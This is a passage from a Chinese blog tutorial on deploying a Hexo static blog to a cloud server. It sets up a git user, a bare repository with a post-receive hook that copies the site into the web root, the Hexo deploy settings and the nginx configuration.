<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorzied_keys</span><br></pre></td></tr></table></figure>
<p>第二步没有成功，说我没有权限（Permission denied）；emmm，root设置好了</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpK8U.png"><br>root设置第二步：(注意在.ssh目录下)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit // 退出到 root 登录</span><br><span class="line">sudo chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Djp2Pf.png"><br>现在就搭建好git桥梁，为后面实现hexo d部署时，可以自动上传啦！</p>
<h3 id="创建blog-git空仓库"><a href="#创建blog-git空仓库" class="headerlink" title="创建blog.git空仓库"></a>创建blog.git空仓库</h3><h4 id="切换到git用户，接下来都是在git用户权限下进行操作："><a href="#切换到git用户，接下来都是在git用户权限下进行操作：" class="headerlink" title="切换到git用户，接下来都是在git用户权限下进行操作："></a>切换到git用户，接下来都是在git用户权限下进行操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git                //切换git用户</span><br><span class="line">cd /home/git/</span><br><span class="line">mkdir -p projects/blog  //创建你的博客目录</span><br><span class="line">mkdir repos &amp;&amp; cd repos</span><br><span class="line">git init --bare blog.git  //创建一个空仓库</span><br><span class="line">cd blog.git/hooks</span><br><span class="line">vi post-receive  //创建hook钩子函数，输入以下内容</span><br><span class="line">git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f</span><br><span class="line">chmod +x post-receive  // 修改钩子函数权限</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj98SS.png"></p>
<h4 id="改变-hexo-git-目录的拥有者为git用户："><a href="#改变-hexo-git-目录的拥有者为git用户：" class="headerlink" title="改变 hexo.git 目录的拥有者为git用户："></a>改变 hexo.git 目录的拥有者为git用户：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chown -R git:git blog.git</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj9BWT.png"></p>
<h5 id="添加备份目录"><a href="#添加备份目录" class="headerlink" title="添加备份目录"></a>添加备份目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/projects/</span><br><span class="line">mkdir -p tmp/blog</span><br></pre></td></tr></table></figure>
<p>修改钩子的内容：（重点是git clone 克隆到主目录home&#x2F;git&#x2F;projects&#x2F;blog主目录要配置到nginx中去的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">GIT_REPO=/home/git/repos/blog.git    # git仓库</span><br><span class="line">TMP_GIT_CLONE=/home/git/projects/tmp/blog</span><br><span class="line">PUBLIC_WWW=/home/git/projects/blog  # 网站目录</span><br><span class="line">rm -rf $&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line">rm -rf $&#123;PUBLIC_WWW&#125;/*</span><br><span class="line">cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;</span><br><span class="line">chmod +x post-receive          # 赋予脚本的执行权限</span><br></pre></td></tr></table></figure>
<p>git用户赋权：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod +x post-receive</span><br><span class="line">exit // 退出到 root 登录</span><br><span class="line">chown -R git:git /home/git/repos/blog.git // 添加权限</span><br><span class="line">sudo chown git:git -R /home/git/projects/</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjCPmj.png"></p>
<p>蓝色为更新后的上传机制：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCncF.png"></p>
<p>为了安全起见，我们需要关闭git账号登录shell的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/passwd</span><br></pre></td></tr></table></figure>
<p>找到git账号(一般在最后面)添加：&#x2F;usr&#x2F;bin&#x2F;git-shell</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCl7R.png"></p>
<p>加上git就只能git clone，如需shell操作，撤销&#x2F;usr&#x2F;bin&#x2F;git-shell即可。</p>
<p>####在本地任意一空目录，测试git仓库是否可用（测试步骤，稍后可清除）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@48.53.57.50:/home/git/repos/blog.git</span><br></pre></td></tr></table></figure>

<p>实际拉下来的是你的&#x2F;home&#x2F;git&#x2F;projects&#x2F;blog，哈哈哈还是空的~</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjC3A1.png"></p>
<h3 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a>hexo配置</h3><p>修改博客根目录配置_config.yml，部署部分，增添repo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  message: update</span><br><span class="line">  gitee: https://gitee.com/cungudafa/cungudafa.git</span><br><span class="line">  repo: git@48.53.57.50:/home/git/repos/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<blockquote>
<p>只有在ssh秘钥配置成功，才能成功上传。如果需要修改公钥，要打开git操作shell的权限哦！vim &#x2F;etc&#x2F;passwd最后一句。及时开，及时关，做到万无一失。</p>
</blockquote>
<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><ul>
<li>到这里，我发现一个问题，用源码安装和sudo apt install nginx安装，文件结构是不同的</li>
<li>这里我选择的是sudo apt install nginx的方式安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
<p>修改用户为root用户</p>
<p><img src="https://s3.ax1x.com/2020/12/06/Dji6Og.png"></p>
<p>1.端口号（阿里云控制台安全组规则要打开端口哦）<br>2.修改域名<br>3.修改根目录位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/12/06/DjFPne.png"></p>
<blockquote>
<p>到这里只要重启nginx就可以了，但是我没发现sbin文件，就从进程重启了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -HUP 进程号</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjF69x.png"></p>
<p>接下来就可以用域名或者公网IP访问了</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
